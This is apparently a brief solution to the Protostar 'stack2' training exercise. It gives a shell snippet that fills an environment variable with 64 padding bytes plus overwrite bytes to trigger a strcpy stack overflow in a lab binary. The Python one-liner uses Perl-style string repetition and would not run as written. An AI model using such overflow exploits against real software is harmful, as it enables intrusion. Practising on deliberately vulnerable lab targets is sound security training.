## protostar-stack2

strcpy memory overwrite

## 

```sh

GREENIE=`python -c 'print "A"x64+"\x0a\x0d\x0a\x0d"'`
export GREENIE
echo $GREENIE
/opt/protostar/bin/stack2

```